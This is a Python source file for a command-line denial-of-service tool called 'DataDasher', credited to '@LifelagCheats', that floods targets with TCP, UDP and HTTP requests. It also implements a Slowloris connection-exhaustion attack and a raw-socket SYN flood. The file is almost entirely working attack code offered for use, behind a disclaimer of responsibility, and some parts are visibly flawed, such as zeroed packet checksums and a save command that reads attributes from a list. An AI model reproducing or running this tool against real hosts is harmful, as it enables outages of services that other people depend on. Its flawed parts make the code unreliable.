import socket
import threading
import time
import requests
import logging
import re
import json
from rich.console import Console
from rich.prompt import Prompt, Confirm
from rich.progress import track
from rich.table import Table
from prompt_toolkit import PromptSession
from prompt_toolkit.history import FileHistory
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.lexers import PygmentsLexer
import argparse
import random
import string
import os
import sys
import struct

logging.basicConfig(filename='packet_sender.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')
console = Console()

total_packets_sent = 0
total_packets_failed = 0


def validate_ip(ip):
    pattern = re.compile(r'^\d{1,3}(\.\d{1,3}){3}$')
    return bool(pattern.match(ip)) and all(0 <= int(octet) <= 255 for octet in ip.split('.'))


def validate_port(port):
    return 1 <= port <= 65535


def display_title():
    console.print(r"""[bold red]
________       _____       ________              ______              
___  __ \_____ __  /______ ___  __ \_____ __________  /______________
__  / / /  __ `/  __/  __ `/_  / / /  __ `/_  ___/_  __ \  _ \_  ___/
_  /_/ // /_/ // /_ / /_/ /_  /_/ // /_/ /_(__  )_  / / /  __/  /    
/_____/ \__,_/ \__/ \__,_/ /_____/ \__,_/ /____/ /_/ /_/\___//_/     

                                                                 [/bold red]""", style="bold yellow")
    console.print("[bold red]DataDasher DDoS tool v1.0.0 - Created by @LifelagCheats[/bold red]\n")
    console.print("[bold red]I am not responsible for any illegal activities, misuse or damage caused by this tool.[/bold red]")
    console.print("[bold red]Type 'help' for help and usage instructions.[/bold red]\n")


def log_packet_action(action):
    logging.info(action)


def send_tcp_packet(server_ip, server_port, payload, custom_headers=None):
    global total_packets_sent, total_packets_failed
    try:
        tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tcp_socket.settimeout(2)
        tcp_socket.connect((server_ip, server_port))
        if custom_headers:
            for header, value in custom_headers.items():
                tcp_socket.sendall(f"{header}: {value}\r\n".encode())
        tcp_socket.sendall(payload.encode())
        log_packet_action(
            f"TCP Packet sent to {server_ip}:{server_port} - Payload: {payload} - Headers: {custom_headers}")
        console.print(f"[green]TCP Packet sent to {server_ip}:{server_port}[/green]")
        total_packets_sent += 1
        tcp_socket.close()
    except socket.timeout:
        console.print(f"[red]Error: Connection to {server_ip}:{server_port} timed out.[/red]")
        log_packet_action(f"Error: Connection to {server_ip}:{server_port} timed out.")
        total_packets_failed += 1
    except ConnectionRefusedError:
        console.print(f"[red]Error: Connection refused by {server_ip}:{server_port}[/red]")
        log_packet_action(f"Error: Connection refused by {server_ip}:{server_port}")
        total_packets_failed += 1
    except Exception as e:
        console.print(f"[red]Error sending TCP packet: {e}[/red]")
        log_packet_action(f"Error sending TCP packet to {server_ip}:{server_port} - {e}")
        total_packets_failed += 1


def send_udp_packet(server_ip, server_port, payload, custom_headers=None):
    global total_packets_sent, total_packets_failed
    try:
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp_socket.settimeout(2)
        udp_socket.sendto(payload.encode(), (server_ip, server_port))
        log_packet_action(f"UDP Packet sent to {server_ip}:{server_port} - Payload: {payload}")
        console.print(f"[green]UDP Packet sent to {server_ip}:{server_port}[/green]")
        total_packets_sent += 1
        udp_socket.close()
    except socket.timeout:
        console.print(f"[red]Error: UDP packet timed out. Could not reach {server_ip}:{server_port}[/red]")
        log_packet_action(f"Error: UDP packet timed out. Could not reach {server_ip}:{server_port}")
        total_packets_failed += 1
    except Exception as e:
        console.print(f"[red]Error sending UDP packet: {e}[/red]")
        log_packet_action(f"Error sending UDP packet to {server_ip}:{server_port} - {e}")
        total_packets_failed += 1


def http_get_request(url):
    global total_packets_sent, total_packets_failed
    try:
        response = requests.get(url, timeout=2)
        log_packet_action(f"HTTP GET request sent to {url} - Status Code: {response.status_code}")
        console.print(f"[green]HTTP GET request sent to {url} - Status Code: {response.status_code}[/green]")
        total_packets_sent += 1
    except requests.exceptions.Timeout:
        console.print(f"[red]Error: Timeout - HTTP GET request to {url} timed out.[/red]")
        log_packet_action(f"Error: Timeout - HTTP GET request to {url} timed out.")
        total_packets_failed += 1
    except Exception as e:
        console.print(f"[red]Error sending HTTP GET request: {e}[/red]")
        log_packet_action(f"Error sending HTTP GET request to {url} - {e}")
        total_packets_failed += 1


def statistics_display():
    table = Table(title="Packet Sending Statistics")
    table.add_column("Packets Sent", justify="right", style="green")
    table.add_column("Packets Failed", justify="right", style="red")
    table.add_row(str(total_packets_sent), str(total_packets_failed))
    console.print(table)


def get_custom_headers():
    custom_headers = {}
    while True:
        header_name = Prompt.ask("[bold blue]Enter header name (or leave blank to finish)[/]")
        if not header_name:
            break
        header_value = Prompt.ask(f"[bold blue]Enter value for {header_name}:[/]")
        custom_headers[header_name] = header_value
    return custom_headers


def display_packet_structure(protocol, server_ip, server_port, payload, custom_headers=None):
    console.print("[bold magenta]\nPacket Structure Preview:[/]\n")
    if protocol == "TCP":
        console.print(f"Destination IP: {server_ip}")
        console.print(f"Destination Port: {server_port}")
        if custom_headers:
            console.print("Headers:")
            for name, value in custom_headers.items():
                console.print(f"  {name}: {value}")
        console.print(f"Payload: {payload}\n")


def display_help(command=None):
    if command == 'send':
        console.print("[bold blue]send[/] - Send packets to a target.")
        console.print("Usage: send <protocol> <target> <port> [options]")
        console.print("Options:")
        console.print("  -p, --payload <payload>  Specify the packet payload (default: 'Hello, World!')")
        console.print("  -c, --count <count>    Number of packets to send (default: 1)")
        console.print("  -r, --rate <rate>      Packets per second (default: 1)")
        console.print(
            "  -h, --headers <json>   Custom headers in JSON format (e.g., '{\"header\": \"value\"}')")
    elif command == 'stats':
        console.print("[bold blue]stats[/] - Display packet sending statistics.")
    elif command == 'clear':
        console.print("[bold blue]clear[/] - Clear the screen.")
    elif command == 'help':
        console.print("[bold blue]help[/] - Show this help message.")
    elif command == 'exit':
        console.print("[bold blue]exit[/] - Exit DataDasher.")
    elif command == 'save':
        console.print("[bold blue]save[/] - Save the current config.")
        console.print("Usage: save <config_name>")
    elif command == 'load':
        console.print("[bold blue]load[/] - Load a config file.")
        console.print("Usage: load <config_name>")
    elif command == 'slowloris':
        console.print("[bold blue]slowloris[/] - Initiate a Slowloris attack.")
        console.print(
            "Usage: slowloris <target> <port> [options]"
        )
        console.print("Options:")
        console.print("  -c, --count <count>   Number of connections to establish (default: 500)")
        console.print(
            "  -r, --rate <rate>     Delay in seconds between sending headers (default: 5)"
        )
        console.print(
            "  -t, --timeout <timeout> Timeout in seconds before refreshing connections (default: 60)"
        )
        console.print("  -p, --payload <payload> Specify initial HTTP request (default: GET)")
    elif command == "synflood":
        console.print("[bold blue]synflood[/] - Perform a SYN flood attack.")
        console.print("Usage: synflood <target> <port> [options]")
        console.print("Options:")
        console.print("  -c, --count <count> Number of SYN packets to send (default: 1000)")
        console.print("  -r, --rate <rate> Packets per second to send (default: 100)")
    else:
        console.print("[bold blue]Available commands:[/]")
        console.print("  [bold blue]send[/]     - Send packets to a target.")
        console.print("  [bold blue]stats[/]     - Display packet sending statistics.")
        console.print("  [bold blue]clear[/]     - Clear the screen.")
        console.print("  [bold blue]help[/]     - Show this help message.")
        console.print("  [bold blue]save[/]     - Save the current config.")
        console.print("  [bold blue]load[/]     - Load a config file.")
        console.print("  [bold blue]slowloris[/] - Initiate a Slowloris attack.")
        console.print("  [bold blue]synflood[/]  - Perform a SYN flood attack.")
        console.print("  [bold blue]exit[/]     - Exit DataDasher.")
        console.print("\nType 'help <command>' for more information on a specific command.")


def generate_random_payload(length, charset=string.ascii_letters + string.digits):
    return ''.join(random.choice(charset) for _ in range(length))


def load_payload_from_file(file_path):
    if not os.path.isfile(file_path):
        console.print(f"[red]Error: File not found: {file_path}[/red]")
        return None
    try:
        with open(file_path, 'rb') as f:
            return f.read()
    except Exception as e:
        console.print(f"[red]Error: Could not load file: {e}[/red]")
        return None


def get_target_ip(domain_name):
    try:
        return socket.gethostbyname(domain_name)
    except socket.gaierror:
        console.print(f"[red]Error: Could not resolve domain name: {domain_name}[/red]")
        return None


def save_config(config, file_path):
    try:
        with open(file_path, 'w') as f:
            json.dump(config, f, indent=4)
        console.print(f"[green]Configuration saved to: {file_path}[/green]")
    except Exception as e:
        console.print(f"[red]Error: Could not save configuration: {e}[/red]")


def load_config(file_path):
    if not os.path.isfile(file_path):
        console.print(f"[red]Error: Configuration file not found: {file_path}[/red]")
        return None
    try:
        with open(file_path, 'r') as f:
            return json.load(f)
    except Exception as e:
        console.print(f"[red]Error: Could not load configuration: {e}[/red]")
        return None


def slowloris_attack(target_ip, target_port, count=500, rate=5, payload="GET / HTTP/1.1\r\nHost: {target}\r\n\r\n",
                     timeout=60):
    global total_packets_sent, total_packets_failed
    sockets = []
    for _ in track(range(count), description="[red]Opening Slowloris connections..."):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            payload = payload.format(target=target_ip)
            sock.sendall(payload.encode())
            sockets.append(sock)
            total_packets_sent += 1
            time.sleep(1 / rate)
        except Exception as e:
            console.print(f"[red]Error opening Slowloris connection: {e}[/red]")
            total_packets_failed += 1
    console.print(f"[yellow]Opened {len(sockets)} Slowloris connections.[/yellow]")
    console.print("[yellow]Keeping connections open... (Press Ctrl+C to interrupt)[/yellow]")
    start_time = time.time()
    try:
        while True:
            if time.time() - start_time > timeout:
                start_time = time.time()
                console.print("[yellow]Closing inactive connections and opening new ones.[/yellow]")
                for sock in sockets:
                    try:
                        sock.close()
                    except Exception as e:
                        console.print(f"[red]Error closing connection: {e}[/red]")
                sockets = []
                for _ in track(range(count), description="[red]Opening Slowloris connections..."):
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.connect((target_ip, target_port))
                        payload = payload.format(target=target_ip)
                        sock.sendall(payload.encode())
                        sockets.append(sock)
                        total_packets_sent += 1
                        time.sleep(1 / rate)
                    except Exception as e:
                        console.print(f"[red]Error opening Slowloris connection: {e}[/red]")
                        total_packets_failed += 1
            for sock in sockets:
                try:
                    for _ in range(random.randint(1, 5)):
                        sock.sendall(f"X-{random.choice(string.ascii_letters)}: {random.randint(1, 5000)}\r\n".encode())
                        total_packets_sent += 1
                    time.sleep(rate)
                except Exception as e:
                    console.print(f"[red]Error sending data to keep connection alive: {e}[/red]")
                    total_packets_failed += 1
    except KeyboardInterrupt:
        console.print("\n[yellow]Interrupting Slowloris attack. Closing connections.[/yellow]")
        for sock in sockets:
            sock.close()


def syn_flood_attack(target_ip, target_port, count=1000, rate=100):
    global total_packets_sent, total_packets_failed
    console.print(f"[red]WARNING: Performing SYN Flood attack!  Use extreme caution![/red]")
    for _ in track(range(count), description="[red]Sending SYN packets..."):
        try:
            ip_header = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 0, 0, 0, 0x40, 0, 0,
                                    socket.inet_aton(socket.gethostbyname(socket.gethostname())),
                                    socket.inet_aton(target_ip))
            tcp_header = struct.pack('!HHLLBBHHH', random.randint(1024, 65535), target_port, 0, 0, 0x02,
                                     0, 0, 0, 0)
            source_ip = socket.inet_aton(socket.gethostbyname(socket.gethostname()))
            pseudo_header = source_ip + socket.inet_aton(target_ip) + b"\x00" + b"\x06" + struct.pack("!H",
                                                                                                      len(tcp_header))
            packet = ip_header + tcp_header
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            s.sendto(packet, (target_ip, target_port))
            s.close()
            total_packets_sent += 1
            time.sleep(1 / rate)
        except Exception as e:
            console.print(f"[red]Error sending SYN packet: {e}[/red]")
            total_packets_failed += 1


def main():
    global total_packets_sent, total_packets_failed
    parser = argparse.ArgumentParser(description='Your Network Tool Description')
    subparsers = parser.add_subparsers(dest='command', help='Available commands')
    send_parser = subparsers.add_parser('send', help='Send packets.')
    send_parser.add_argument('protocol', choices=['TCP', 'UDP', 'HTTP GET'], help='Protocol to use.')
    send_parser.add_argument('target', help='Target IP address or domain name.')
    send_parser.add_argument('port', type=int, nargs='?', help='Target port number (required for TCP/UDP).')
    send_parser.add_argument('-p', '--payload', default='Hello, World!', help='Payload to send.')
    send_parser.add_argument('-c', '--count', type=int, default=1, help='Number of packets to send.')
    send_parser.add_argument('-r', '--rate', type=int, default=1, help='Packets per second.')
    send_parser.add_argument('-f', '--file', metavar='FILE', help='Load payload from file.')
    stats_parser = subparsers.add_parser('stats', help='Display statistics.')
    help_parser = subparsers.add_parser('help', help='Show help message.')
    save_parser = subparsers.add_parser("save", help="Save the current config.")
    save_parser.add_argument("config_name", type=str, help="Name of the config file.")
    load_parser = subparsers.add_parser("load", help="Load a config file.")
    load_parser.add_argument("config_name", type=str, help="Name of the config file.")
    slowloris_parser = subparsers.add_parser("slowloris", help="Initiate a Slowloris attack.")
    slowloris_parser.add_argument("target", help="Target IP address or domain name.")
    slowloris_parser.add_argument("port", type=int, help="Target port number.")
    slowloris_parser.add_argument('-c', '--count', type=int, default=500, help="Number of connections to establish.")
    slowloris_parser.add_argument('-r', '--rate', type=int, default=5,
                                  help="Delay in seconds between sending headers.")
    slowloris_parser.add_argument('-t', '--timeout', type=int, default=60,
                                  help="Timeout in seconds before refreshing connections.")
    slowloris_parser.add_argument('-p', '--payload',
                                  default="GET / HTTP/1.1\r\nHost: {target}\r\n\r\n",
                                  help="Initial part of the HTTP request.")
    synflood_parser = subparsers.add_parser("synflood", help="Perform a SYN flood attack.")
    synflood_parser.add_argument("target", help="Target IP address or domain name.")
    synflood_parser.add_argument("port", type=int, help="Target port number.")
    synflood_parser.add_argument('-c', '--count', type=int, default=1000, help="Number of SYN packets to send.")
    synflood_parser.add_argument('-r', '--rate', type=int, default=100, help="Packets per second to send.")
    if len(sys.argv) > 1:
        args = parser.parse_args()
        if args.command == 'send':
            if args.protocol in ('TCP', 'UDP') and args.port is None:
                console.print("[red]Error: Port number is required for TCP and UDP protocols.[/red]")
                sys.exit(1)
            if args.payload.startswith("random:"):
                try:
                    payload_length = int(args.payload.split("random:")[1])
                    args.payload = generate_random_payload(payload_length)
                except Exception as e:
                    console.print(f"[red]Error parsing 'random' payload length: {e}[/red]")
                    sys.exit(1)
            elif args.payload.startswith("file:"):
                try:
                    file_path = args.payload.split("file:")[1]
                    args.payload = load_payload_from_file(file_path)
                    if args.payload is None:
                        sys.exit(1)
                except Exception as e:
                    console.print(f"[red]Error parsing 'file' payload path: {e}[/red]")
                    sys.exit(1)
            if not validate_ip(args.target):
                target_ip = get_target_ip(args.target)
                if target_ip is None:
                    sys.exit(1)
                args.target = target_ip
            for _ in track(range(args.count), description="Sending packets..."):
                if args.protocol == 'TCP':
                    send_tcp_packet(args.target, args.port, args.payload)
                elif args.protocol == 'UDP':
                    send_udp_packet(args.target, args.port, args.payload)
                elif args.protocol == 'HTTP GET':
                    http_get_request(args.target)
                time.sleep(1 / args.rate)
        elif args.command == 'stats':
            statistics_display()
        elif args.command == 'help':
            display_help()
        elif args.command == 'slowloris':
            if not validate_ip(args.target):
                target_ip = get_target_ip(args.target)
                if target_ip is None:
                    sys.exit(1)
                args.target = target_ip
            slowloris_attack(args.target, args.port, args.count, args.rate, args.payload,
                             args.timeout)
        elif args.command == 'synflood':
            if not validate_ip(args.target):
                target_ip = get_target_ip(args.target)
                if target_ip is None:
                    sys.exit(1)
                args.target = target_ip
            syn_flood_attack(args.target, args.port, args.count, args.rate)
        elif args.command == 'save':
            config = {
                "default_protocol": args.protocol,
                "default_target": args.target,
                "default_port": args.port
            }
            save_config(config, args.config_name)
        elif args.command == 'load':
            config = load_config(args.config_name)
            if config is None:
                sys.exit(1)
            args.protocol = config.get("default_protocol", args.protocol)
            args.target = config.get("default_target", args.target)
            args.port = config.get("default_port", args.port)
    else:
        display_title()
        session = PromptSession(
            history=FileHistory('packet_sender_history.txt'),
            completer=WordCompleter(
                ['send', 'stats', 'clear', 'help', 'save', 'load', 'slowloris', 'synflood', 'exit'],
                ignore_case=True),
        )
        while True:
            try:
                command = session.prompt('> ')
                if command:
                    args = command.split()
                    cmd = args[0].lower()
                    if cmd == 'send':
                        if len(args) < 4:
                            console.print(
                                "[red]Error: Invalid usage. Type 'help send' for correct usage.[/red]")
                            continue
                        protocol = args[1].upper()
                        target = args[2]
                        try:
                            port = int(args[3])
                        except ValueError:
                            console.print("[red]Error: Invalid port number.[/red]")
                            continue
                        payload = 'Hello, World!'
                        count = 1
                        rate = 1
                        custom_headers = {}
                        i = 4
                        while i < len(args):
                            if args[i] in ('-p', '--payload') and i < len(args) - 1:
                                payload = args[i + 1]
                                i += 2
                            elif args[i] in ('-c', '--count') and i < len(args) - 1:
                                try:
                                    count = int(args[i + 1])
                                except ValueError:
                                    console.print("[red]Error: Invalid count value.[/red]")
                                    break
                                i += 2
                            elif args[i] in ('-r', '--rate') and i < len(args) - 1:
                                try:
                                    rate = int(args[i + 1])
                                except ValueError:
                                    console.print("[red]Error: Invalid rate value.[/red]")
                                    break
                                i += 2
                            elif args[i] in ('-h', '--headers') and i < len(args) - 1:
                                try:
                                    custom_headers = json.loads(args[i + 1])
                                except json.JSONDecodeError:
                                    console.print("[red]Error: Invalid JSON format for headers.[/red]")
                                    break
                                i += 2
                            else:
                                console.print(f"[red]Error: Unknown option '{args[i]}'.[/red]")
                                break
                        if protocol == "TCP":
                            for _ in track(range(count), description="Sending packets..."):
                                send_tcp_packet(target, port, payload, custom_headers)
                                time.sleep(1 / rate)
                        elif protocol == "UDP":
                            for _ in track(range(count), description="Sending packets..."):
                                send_udp_packet(target, port, payload, custom_headers)
                                time.sleep(1 / rate)
                        elif protocol == "HTTP GET":
                            for _ in track(range(count), description="Sending requests..."):
                                http_get_request(target)
                                time.sleep(1 / rate)
                        else:
                            console.print(
                                f"[red]Error: Invalid protocol '{protocol}'. Choose from TCP, UDP, or HTTP GET.[/red]"
                            )
                    elif cmd == 'stats':
                        statistics_display()
                    elif cmd == 'clear':
                        console.clear()
                        display_title()
                    elif cmd == 'help':
                        if len(args) > 1:
                            display_help(args[1].lower())
                        else:
                            display_help()
                    elif cmd == 'save':
                        if len(args) < 2:
                            console.print("[red]Error: Provide a file path to save the configuration.[/red]")
                            continue
                        config_file = args[1]

                        # Get current settings (replace these with your actual setting variables):
                        config = {
                            "default_protocol": args.protocol,
                            "default_target": args.target,
                            "default_port": args.port
                            # ... add other settings
                        }

                        save_config(config, config_file)
                    elif cmd == 'load':
                        if len(args) < 2:
                            console.print("[red]Error: Provide a file path to load the configuration.[/red]")
                            continue
                        config_file = args[1]
                        config = load_config(config_file)
                        if config is None:
                            continue
                    elif cmd == 'slowloris':
                        if len(args) < 3:
                            console.print(
                                "[red]Error: Invalid usage. Type 'help slowloris' for correct usage.[/red]")
                            continue
                        target = args[1]
                        try:
                            port = int(args[2])
                        except ValueError:
                            console.print("[red]Error: Invalid port number.[/red]")
                            continue

                        # Default values
                        count = 500
                        rate = 5
                        timeout = 60
                        payload = "GET / HTTP/1.1\r\nHost: {target}\r\n\r\n"

                        # Parse additional arguments for slowloris
                        i = 3
                        while i < len(args):
                            if args[i] in ("-c", "--count") and i < len(args) - 1:
                                try:
                                    count = int(args[i + 1])
                                except ValueError:
                                    console.print("[red]Error: Invalid count value.[/red]")
                                    break
                                i += 2
                            elif args[i] in ("-r", "--rate") and i < len(args) - 1:
                                try:
                                    rate = int(args[i + 1])
                                except ValueError:
                                    console.print("[red]Error: Invalid rate value.[/red]")
                                    break
                                i += 2
                            elif args[i] in ("-t", "--timeout") and i < len(args) - 1:
                                try:
                                    timeout = int(args[i + 1])
                                except ValueError:
                                    console.print("[red]Error: Invalid timeout value.[/red]")
                                    break
                                i += 2
                            elif args[i] in ("-p", "--payload") and i < len(args) - 1:
                                payload = args[i + 1]
                                i += 2
                            else:
                                console.print(f"[red]Error: Unknown option '{args[i]}' for slowloris.[/red]")
                                break
                        if not validate_ip(target):
                            target_ip = get_target_ip(target)
                            if target_ip is None:
                                continue
                            target = target_ip  # Update target with resolved IP

                        slowloris_attack(target, port, count, rate, payload, timeout)
                    elif cmd == 'synflood':
                        if len(args) < 3:
                            console.print(
                                "[red]Error: Invalid usage. Type 'help synflood' for correct usage.[/red]")
                            continue
                        target = args[1]
                        try:
                            port = int(args[2])
                        except ValueError:
                            console.print("[red]Error: Invalid port number.[/red]")
                            continue

                        # Default values
                        count = 1000
                        rate = 100

                        # Parse additional arguments for synflood
                        i = 3
                        while i < len(args):
                            if args[i] in ("-c", "--count") and i < len(args) - 1:
                                try:
                                    count = int(args[i + 1])
                                except ValueError:
                                    console.print("[red]Error: Invalid count value.[/red]")
                                    break
                                i += 2
                            elif args[i] in ("-r", "--rate") and i < len(args) - 1:
                                try:
                                    rate = int(args[i + 1])
                                except ValueError:
                                    console.print("[red]Error: Invalid rate value.[/red]")
                                    break
                                i += 2
                            else:
                                console.print(f"[red]Error: Unknown option '{args[i]}' for synflood.[/red]")
                                break

                        if not validate_ip(target):
                            target_ip = get_target_ip(target)
                            if target_ip is None:
                                continue
                            target = target_ip

                        syn_flood_attack(target, port, count, rate)
                    elif cmd == 'exit':
                        if Confirm.ask("Are you sure you want to exit?"):
                            console.print("[bold green]Exiting DataDasher. Goodbye![/]")
                            break
                    else:
                        console.print(
                            f"[red]Error: Unknown command '{cmd}'. Type 'help' for available commands.[/red]")
                else:
                    pass
            except KeyboardInterrupt:
                console.print("\n[yellow]Interrupted![/]")
            except EOFError:
                console.print("\n[yellow]Exiting...[/]")
                break


if __name__ == "__main__":
    main()